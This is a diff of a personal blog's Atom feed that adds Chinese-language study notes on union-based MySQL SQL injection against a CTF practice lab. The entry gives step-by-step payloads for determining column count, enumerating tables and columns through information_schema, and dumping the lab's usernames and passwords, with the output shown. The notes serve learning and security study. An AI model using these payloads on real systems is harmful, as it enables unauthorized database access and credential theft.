@@ -2,13 +2,115 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Place-Serenity.github.io</id>
     <title>my blog</title>
-    <updated>2020-04-26T12:36:59.043Z</updated>
+    <updated>2020-05-02T18:52:39.974Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Place-Serenity.github.io"/>
     <link rel="self" href="https://Place-Serenity.github.io/atom.xml"/>
     <logo>https://Place-Serenity.github.io/images/avatar.png</logo>
     <icon>https://Place-Serenity.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, my blog</rights>
+    <entry>
+        <title type="html"><![CDATA[SQL注入笔记01]]></title>
+        <id>https://Place-Serenity.github.io/sql-zhu-ru-bi-ji-01/</id>
+        <link href="https://Place-Serenity.github.io/sql-zhu-ru-bi-ji-01/">
+        </link>
+        <updated>2020-05-02T18:49:39.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<p>--+Mysql 注入中最常见的注释符号</p>
+<p>-- 这个才是Mysql真正的注释符号</p>
+<p><em>+号会被浏览器进行url编码，编码成一个空格</em></p>
+<p>union select 为sql注入中最常见的一种攻击方式，在mysql数据库查询中是联合查询的意思</p>
+<p>构造一个id</p>
+<p>?id = ' union select 1,2,3 --+</p>
+<p>字段数：</p>
+<p>怎么确定字段数</p>
+<p>order by 语句来确定字段数</p>
+<p>/*</p>
+<p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p>
+<p>ORDER BY 语句默认按照升序度对记录知进行排序。</p>
+<p>*/</p>
+<p>order by 4</p>
+<p>示例（华理ctf靶场）：</p>
+<p>http://39.105.84.217:40004/Less-1/?id='order by 4 --+</p>
+<p>得到报错Unknown column '4' in 'order clause'</p>
+<p>通过此报错，就可以确定mysql中，这个数据库的字段为3，所以，我们在使用mysql 进行联合查询时（union select），输入1,2,3进行攻击</p>
+<p>union select 1,2,3</p>
+<p><em><strong>如何查询数据？</strong></em></p>
+<p>第一步：获取当前数据库名称及当前数据库用户</p>
+<p>/*</p>
+<p>http://39.105.84.217:40004/Less-1/?id='union select 1,2,3 --+</p>
+<p>显示：</p>
+<p>Welcome  Dhakkan<br>
+Your Login name:2<br>
+Your Password:3</p>
+<p>*/</p>
+<p>使用函数：database()，user()</p>
+<p>获取到，当前数据库名称为security，当前数据库操作用户为root</p>
+<p>/*</p>
+<p>http://39.105.84.217:40004/Less-1/?id='union select 1,database(),user() --+</p>
+<p>显示：</p>
+<p>Welcome  Dhakkan<br>
+Your Login name:security<br>
+Your Password:root@localhost</p>
+<p>*/</p>
+<p>第二步：获取表名称</p>
+<p>information_schema是mysql 5.0及以上版本自带数据库，用于存储mysql中的所有数据库和数据表和列</p>
+<p>information_schema.tables数据库中的表名称</p>
+<p>information_schema.columns数据库中的列名称</p>
+<p>table_name表名</p>
+<p>table_schema数据库名</p>
+<p>&quot;.&quot;在数据库中表示下一级</p>
+<p>获取表名称的语句：</p>
+<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'</p>
+<p>group_concat将查询到的数据都列出来</p>
+<p>/*</p>
+<p>http://39.105.84.217:40004/Less-1/</p>
+<p>?id='union select 1,table_name,</p>
+<p>3 from information_schema.tables where table_schema='security' --+</p>
+<p>条件：where table_schema='security'</p>
+<p>Welcome  Dhakkan<br>
+Your Login name:emails<br>
+Your Password:3（这里只输出了一个表名）</p>
+<p>http://39.105.84.217:40004/Less-1/</p>
+<p>?id='union select 1,group_concat(table_name),</p>
+<p>3 from information_schema.tables where table_schema='security' --+</p>
+<p>Welcome  Dhakkan<br>
+Your Login name:emails,referers,uagents,users<br>
+Your Password:3</p>
+<p>emmm这里应该还是sql语法知识欠缺</p>
+<p>所以闹了一个笑话：</p>
+<p>http://39.105.84.217:40004/Less-1/?id='union select 1,table_name(),table_schema() --+</p>
+<p>尝试跟刚刚一样，直接让他输出出来,但是报错了</p>
+<p>原因是table_name是表名，不是一个函数</p>
+<p>换了一下，发现还是报错...</p>
+<p>http://39.105.84.217:40004/Less-1/?id='union select 1,table_name,table_schema() --+</p>
+<p>Welcome  Dhakkan<br>
+Unknown column 'table_name' in 'field list'</p>
+<p>(“字段列表”中的“表名”列未知)</p>
+<p>*/</p>
+<p>第三步：获取列名称</p>
+<p>获取列名称的语句：</p>
+<p>/*</p>
+<p>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'</p>
+<p>Welcome  Dhakkan<br>
+Your Login name:id,username,password<br>
+Your Password:3</p>
+<p>这里虽然没有限制数据库，可也并未像视频中那样输出n多的列名，可能是该靶场的数据库只有一个</p>
+<p>*/</p>
+<p>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security'</p>
+<p>必须加上限定条件（限定数据库）</p>
+<p>第四步：获取数据</p>
+<p>union select 1,group_concat(username),group_concat(password) from users</p>
+<p>/*</p>
+<p>http://39.105.84.217:40004/Less-1/?id='union select 1,group_concat(username),group_concat(password) from users--+</p>
+<p>显示：</p>
+<p>Welcome  Dhakkan<br>
+Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
+<p>*/</p>
+<p>这里没有听懂为什么不用限定数据库</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[4.26 c作业]]></title>
         <id>https://Place-Serenity.github.io/426-c-zuo-ye/</id>
